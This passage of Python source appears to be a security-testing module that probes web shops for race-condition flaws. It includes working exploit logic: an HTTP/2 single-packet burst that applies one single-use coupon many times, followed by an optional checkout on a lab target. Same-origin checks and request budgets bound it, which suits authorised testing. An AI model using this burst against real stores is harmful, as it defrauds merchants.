            key = (form.get("method"), form.get("url"), tuple(sorted((form.get("fields") or {}).keys())))
            if key in seen_forms:
                continue
            seen_forms.add(key)
            unique_forms.append(form)
        return {
            "pages": pages,
            "forms": unique_forms,
            "codes": list(dict.fromkeys(codes))[:12],
            "errors": errors[:10],
            "pagesFetched": len(visited),
        }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "error": reason, "fallback": False, "findings": []}

        target = _http_target(parameters.get("target") or parameters.get("url"))
        assert target is not None
        cookie = _cookie_value(parameters)
        assert cookie is not None
        auth_headers = _safe_auth_headers(parameters.get("authHeaders"))
        http_headers = {"Cookie": cookie, **auth_headers}
        proof_level = str(parameters["proofLevel"]).lower()
        max_pages = _clamp(parameters.get("maxDiscoveryPages"), DEFAULT_DISCOVERY_PAGES, 1, HARD_MAX_DISCOVERY_PAGES)
        race_count = _clamp(parameters.get("maxRaceRequests"), DEFAULT_RACE_REQUESTS, 2, HARD_MAX_RACE_REQUESTS)
        request_budget = _clamp(parameters.get("requestBudget"), DEFAULT_REQUEST_BUDGET, 16, HARD_REQUEST_BUDGET)
        timeout_seconds = _clamp(parameters.get("timeoutSeconds"), DEFAULT_TIMEOUT_SECONDS, 5, HARD_TIMEOUT_SECONDS)
        hint_urls = [
            str(hint.get("url"))
            for hint in parameters.get("candidateHints") or []
            if isinstance(hint, dict) and hint.get("url")
        ]
        secret_values: List[Any] = [cookie, *auth_headers.values()]
        evidence: List[Dict[str, Any]] = []
        sequential_requests = 0
        nonce = secrets.token_hex(8).upper()
        discovery_summary: Dict[str, Any] = {}

        def no_finding(failure_reason: str, *, success: bool = True) -> Dict[str, Any]:
            return {
                "success": success,
                "tool": self.name,
                "toolName": self.name,
                "target": target,
                "mode": MODE,
                "proofLevel": proof_level,
                "fallback": False,
                "verification": {
                    "verified": False,
                    "reason": failure_reason,
                    "fallback": False,
                    "requestCount": sequential_requests,
                    "evidence": evidence,
                    "discovery": discovery_summary,
                },
                "findings": [],
                "total_findings": 0,
            }

        connector = aiohttp.TCPConnector(ssl=True)
        try:
            async with aiohttp.ClientSession(
                connector=connector,
                cookie_jar=aiohttp.DummyCookieJar(),
            ) as session:
                discovery = await self._discover(
                    session,
                    target,
                    http_headers,
                    max_pages,
                    timeout_seconds,
                    hint_urls,
                )
                discovery_summary = {
                    "pagesFetched": discovery["pagesFetched"],
                    "formsObserved": len(discovery["forms"]),
                    "singleUseForms": len([form for form in discovery["forms"] if is_single_use_form(form)]),
                    "productAddForms": len([form for form in discovery["forms"] if is_product_add_form(form)]),
                    "codesObserved": len(discovery["codes"]),
                    "errors": discovery["errors"],
                }
                sequential_requests += discovery["pagesFetched"]
                if sequential_requests + race_count + 9 > request_budget:
                    return no_finding("request budget is too small for discovery plus one bounded proof", success=False)

                root_page = next((page for page in discovery["pages"] if page["url"] == target), None)
                root_body = str(root_page.get("body") or "") if root_page else ""
                solved_before = bool(_SOLVED.search(root_body))
                unsolved_before = bool(_UNSOLVED.search(root_body))
                if proof_level == "lab-state-change":
                    if not root_page or solved_before or not unsolved_before:
                        return no_finding("fresh unsolved lab baseline was not confirmed")
                    evidence.append(
                        build_http_step(
                            "unsolved-baseline",
                            "GET",
                            target,
                            "",
                            root_page["response"],
                            secret_values,
                        )
                    )

                forms = discovery["forms"]
                codes = discovery["codes"]
                single_use_forms = [form for form in forms if is_single_use_form(form)]

                # Coupon forms are often rendered only after the cart has one
                # item. Seed one observed product with quantity=1, preferring
                # the highest displayed price, then re-read the cart.
                if not single_use_forms:
                    add_forms = [form for form in forms if is_product_add_form(form)]
                    if not add_forms:
                        return no_finding("no same-origin single-use action or reversible setup form was discovered")
                    add_form = sorted(
                        add_forms,
                        key=lambda form: float(form.get("sourceTotal") or 0.0),
                        reverse=True,
                    )[0]
                    overrides = {
                        name: "1"
                        for name in add_form.get("fields") or {}
                        if _QUANTITY_FIELD.fullmatch(name)
                    }
                    add_body = _fresh_form_body(add_form, overrides)
                    add_response = await self._request(
                        session, "POST", add_form["url"], http_headers, timeout_seconds, add_body
                    )
                    sequential_requests += 1
                    evidence.append(
                        build_http_step(
                            "reversible-state-setup",
                            "POST",
                            add_form["url"],
                            add_body,
                            add_response,
                            secret_values,
                        )
                    )
                    if add_response["truncated"] or add_response["status"] >= 500:
                        return no_finding("bounded reversible setup did not complete safely")
                    # A successful add-to-cart POST commonly redirects back to
                    # the product page (for example ``redir=PRODUCT``).  That
                    # Location is navigation state, not necessarily the state
                    # resource whose form action we just exercised.  Re-read
                    # the observed action URL first, then use a same-origin
                    # redirect only as a bounded fallback.  This stays generic:
                    # neither ``/cart`` nor a coupon endpoint is hard-coded.
                    state_urls = [str(add_form["url"])]
                    location = add_response["headers"].get("Location")
                    if location:
                        state_urls.append(urljoin(add_form["url"], str(location)))

                    seen_state_urls: set[str] = set()
                    for state_url in state_urls:
                        if state_url in seen_state_urls:
                            continue
                        seen_state_urls.add(state_url)
                        if not _same_origin(target, state_url):
                            return no_finding("setup response left the authorized origin", success=False)
                        if _UNSAFE_DISCOVERY_PATH.search(_path_and_query(state_url)):
                            continue
                        state_response = await self._request(
                            session, "GET", state_url, http_headers, timeout_seconds
                        )
                        sequential_requests += 1
                        state_body = str(state_response.get("body") or "")
                        if (
                            state_response["truncated"]
                            or state_response["status"] >= 400
                            or not state_body
                        ):
                            continue
                        forms.extend(_forms_from_html(state_body, state_url))
                        codes = list(
                            dict.fromkeys([*codes, *extract_single_use_codes(state_body)])
                        )
                        single_use_forms = [
                            form for form in forms if is_single_use_form(form)
                        ]
                        if single_use_forms:
                            break

                if not single_use_forms:
                    return no_finding("no same-origin single-use action form was discovered after bounded setup")
                if not codes:
                    return no_finding("no response-observed single-use code was available; caller values are not accepted")

                hint_set = set(hint_urls)
                if hint_set:
                    hinted = [form for form in single_use_forms if form.get("url") in hint_set]
                    if hinted:
                        single_use_forms = hinted
                action_form = sorted(
                    single_use_forms,
                    key=lambda form: (
                        0 if _SINGLE_USE_PATH.search(str(form.get("url") or "")) else 1,
                        str(form.get("url") or ""),
                    ),
                )[0]
                action_field = _single_use_field(action_form)
                if not action_field:
                    return no_finding("single-use candidate has no supported action field")
                code = codes[0]
                state_url = str(action_form.get("sourceUrl") or target)
                if not _same_origin(target, state_url):
                    return no_finding("candidate state page is outside the authorized origin", success=False)

                # Refresh the candidate page immediately before every sensitive
                # phase. Discovery CSRF/defaults are routing evidence, not replay material.
                state_before_response = await self._request(
                    session, "GET", state_url, http_headers, timeout_seconds
                )
                sequential_requests += 1
                state_before_body = str(state_before_response.get("body") or "")
                fresh_forms = _forms_from_html(state_before_body, state_url)
                refreshed = next(
                    (
                        form
                        for form in fresh_forms
                        if form.get("url") == action_form.get("url") and is_single_use_form(form)
                    ),
                    None,
                )
                if not refreshed:
                    return no_finding("fresh single-use form/CSRF material was not available")
                action_form = refreshed
                before_total = _money_total(state_before_body)
                before_code_count = state_before_body.upper().count(code.upper())
                evidence.append(
                    build_http_step(
                        "state-before-controls",
                        "GET",
                        state_url,
                        "",
                        state_before_response,
                        secret_values,
                    )
                )

                invalid_code = f"{INVALID_CONTROL_PREFIX}{nonce}"
                invalid_body = _fresh_form_body(action_form, {action_field: invalid_code})
                for index in range(2):
                    invalid_response = await self._request(
                        session,
                        "POST",
                        action_form["url"],
                        http_headers,
                        timeout_seconds,
                        invalid_body,
                    )
                    sequential_requests += 1
                    evidence.append(
                        build_http_step(
                            f"invalid-serial-control-{index + 1}",
                            "POST",
                            action_form["url"],
                            invalid_body,
                            invalid_response,
                            secret_values,
                        )
                    )

                state_after_controls = await self._request(
                    session, "GET", state_url, http_headers, timeout_seconds
                )
                sequential_requests += 1
                controls_body = str(state_after_controls.get("body") or "")
                controls_total = _money_total(controls_body)
                controls_unchanged = (
                    before_total is not None
                    and controls_total is not None
                    and abs(before_total - controls_total) < 0.001
                )
                evidence.append(
                    build_http_step(
                        "state-after-invalid-controls",
                        "GET",
                        state_url,
                        "",
                        state_after_controls,
                        secret_values,
                    )
                )
                if not controls_unchanged:
                    return no_finding("invalid serial controls changed or could not measure the shared state")

                # Refresh again after controls so the burst never uses a stale token.
                refreshed_forms = _forms_from_html(controls_body, state_url)
                action_form = next(
                    (
                        form
                        for form in refreshed_forms
                        if form.get("url") == action_form.get("url") and is_single_use_form(form)
                    ),
                    None,
                )
                if not action_form:
                    return no_finding("single-use form disappeared before the race")
                race_body = _fresh_form_body(action_form, {action_field: code})
                csrf_values = [
                    value
                    for name, value in (action_form.get("fields") or {}).items()
                    if _CSRF_FIELD.search(str(name)) and value
                ]
                secret_values.extend(csrf_values)
                race_result = await asyncio.to_thread(
                    h2_single_packet_race,
                    action_form["url"],
                    cookie,
                    race_body,
                    race_count,
                    timeout_seconds,
                    auth_headers,
                )
                evidence.append(
                    build_race_step(
                        action_form["url"],
                        race_body,
                        race_result,
                        secret_values,
                    )
                )

                if (
                    race_result.get("protocol") != "h2"
                    or race_result.get("singlePacket") is not True
                    or race_result.get("releaseSendCalls") != 1
                    or race_result.get("completedStreams", 0) < 2
                ):
                    return no_finding("HTTP/2 single-packet proof did not complete; no fallback was used")

                await asyncio.sleep(0.35)
                state_after_race = await self._request(
                    session, "GET", state_url, http_headers, timeout_seconds
                )
                sequential_requests += 1
                after_race_body = str(state_after_race.get("body") or "")
                after_race_total = _money_total(after_race_body)
                after_code_count = after_race_body.upper().count(code.upper())
                code_effects = max(0, after_code_count - before_code_count)
                percent = _discount_percent(code)
                one_apply_floor = (
                    before_total * (1.0 - percent / 100.0)
                    if before_total is not None and percent is not None
                    else None
                )
                compounded_overrun = bool(
                    after_race_total is not None
                    and one_apply_floor is not None
                    and after_race_total < one_apply_floor - 0.01
                )
                multiple_effects = code_effects >= 2 or compounded_overrun
                evidence.append(
                    build_http_step(
                        "state-after-race",
                        "GET",
                        state_url,
                        "",
                        state_after_race,
                        secret_values,
                    )
                )

                # A post-race serial replay must now be rejected or leave the
                # state unchanged. This demonstrates the action is single-use,
                # while the synchronized group produced the extra effects.
                replay_forms = _forms_from_html(after_race_body, state_url)
                replay_form = next(
                    (
                        form
                        for form in replay_forms
                        if form.get("url") == action_form.get("url") and is_single_use_form(form)
                    ),
                    None,
                )
                if not replay_form:
                    return no_finding("fresh post-race serial control form was unavailable")
                replay_body = _fresh_form_body(replay_form, {action_field: code})
                replay_response = await self._request(
                    session,
                    "POST",
                    replay_form["url"],
                    http_headers,
                    timeout_seconds,
                    replay_body,
                )
                sequential_requests += 1
                evidence.append(
                    build_http_step(
                        "post-race-serial-replay",
                        "POST",
                        replay_form["url"],
                        replay_body,
                        replay_response,
                        secret_values,
                    )
                )
                state_after_replay = await self._request(
                    session, "GET", state_url, http_headers, timeout_seconds
                )
                sequential_requests += 1
                replay_state_body = str(state_after_replay.get("body") or "")
                after_replay_total = _money_total(replay_state_body)
                replay_unchanged = bool(
                    after_race_total is not None
                    and after_replay_total is not None
                    and abs(after_race_total - after_replay_total) < 0.001
                )
                replay_rejected = bool(
                    replay_response["status"] >= 400
                    or _SERIAL_REJECTION.search(str(replay_response.get("body") or ""))
                    or replay_unchanged
                )
                evidence.append(
                    build_http_step(
                        "state-after-serial-replay",
                        "GET",
                        state_url,
                        "",
                        state_after_replay,
                        secret_values,
                    )
                )

                runtime_verified = bool(multiple_effects and replay_rejected and controls_unchanged)
                solved_after: Optional[bool] = None
                finalizer_url: Optional[str] = None
                if runtime_verified and proof_level == "lab-state-change":
                    final_forms = _forms_from_html(replay_state_body, state_url)
                    finalizer = next((form for form in final_forms if is_checkout_form(form)), None)
                    if not finalizer:
                        return no_finding("race was proven but no same-origin lab finalizer was discovered")
                    finalizer_url = str(finalizer["url"])
                    finalizer_body = _fresh_form_body(finalizer, {})
                    finalizer_response = await self._request(
                        session,
                        "POST",
                        finalizer_url,
                        http_headers,
                        timeout_seconds,
                        finalizer_body,
                    )
                    sequential_requests += 1
                    evidence.append(
                        build_http_step(
                            "approved-lab-finalizer",
                            "POST",
                            finalizer_url,
                            finalizer_body,
                            finalizer_response,
                            secret_values,
                        )
                    )
                    finalizer_location = (
                        finalizer_response.get("headers", {}).get("Location")
                        if finalizer_response.get("headers")
                        else None
                    )
                    if finalizer_response.get("status") in {301, 302, 303} and finalizer_location:
                        confirmation_url = _safe_http_url(
                            urljoin(finalizer_url, str(finalizer_location))
                        )
                        if confirmation_url and _same_origin(target, confirmation_url):
                            confirmation_response = await self._request(
                                session,
                                "GET",
                                confirmation_url,
                                http_headers,
                                timeout_seconds,
                            )
                            sequential_requests += 1
                            evidence.append(
                                build_http_step(
                                    "approved-lab-finalizer-confirmation",
                                    "GET",
                                    confirmation_url,
                                    "",
                                    confirmation_response,
                                    secret_values,
                                )
                            )
                    solved_response = await self._request(
                        session, "GET", target, http_headers, timeout_seconds
                    )
                    sequential_requests += 1
                    solved_after = bool(_SOLVED.search(str(solved_response.get("body") or "")))
                    evidence.append(
                        build_http_step(
                            "solved-confirmation",
                            "GET",
                            target,
                            "",
                            solved_response,
                            secret_values,
                        )
                    )

                verified = bool(
                    runtime_verified
                    and (
                        proof_level == "runtime-limit-overrun"
                        or (solved_before is False and solved_after is True)
                    )
                )
                verification = {
                    "verified": verified,
                    "mode": MODE,
                    "proofLevel": proof_level,
                    "target": target,
                    "actionUrl": action_form["url"],
                    "actionField": action_field,
                    "singleUseCodeSha256": _sha256(code),
                    "raceRequests": race_count,
                    "protocol": race_result.get("protocol"),
                    "singlePacket": race_result.get("singlePacket"),
                    "releaseSendCalls": race_result.get("releaseSendCalls"),
                    "completedStreams": race_result.get("completedStreams"),
                    "statusDistribution": race_result.get("statusDistribution"),
                    "beforeTotal": before_total,
                    "controlsTotal": controls_total,
                    "afterRaceTotal": after_race_total,
                    "afterReplayTotal": after_replay_total,
                    "discountPercentDerived": percent,
                    "singleApplyFloor": one_apply_floor,
                    "codeEffects": code_effects,
                    "controlsUnchanged": controls_unchanged,
                    "compoundedOverrun": compounded_overrun,
                    "multipleEffects": multiple_effects,
                    "serialReplayRejected": replay_rejected,
                    "serialReplayStateUnchanged": replay_unchanged,
                    "finalizerUrl": finalizer_url,
                    "solvedBefore": solved_before,
                    "solvedAfter": solved_after,
                    "fallback": False,
                    "requestCount": sequential_requests + race_count,
                    "discovery": discovery_summary,
                    "evidence": evidence,
                }
                findings = [build_finding(target, verification)] if verified else []
                return {
                    "success": True,
                    "tool": self.name,
                    "toolName": self.name,
                    "target": target,
                    "mode": MODE,
                    "proofLevel": proof_level,
                    "fallback": False,
                    "verification": verification,
                    "findings": findings,
                    "total_findings": len(findings),
                    "summary": {
                        "verified": verified,
                        "multipleEffects": multiple_effects,
                        "serialReplayRejected": replay_rejected,
                        "solvedTransition": solved_before is False and solved_after is True,
                        "requestCount": sequential_requests + race_count,
                    },
                }
        except Exception as exc:
            return no_finding(_safe_error(exc), success=False)


def get_tool() -> RaceConditionProbeTool:
    return RaceConditionProbeTool()
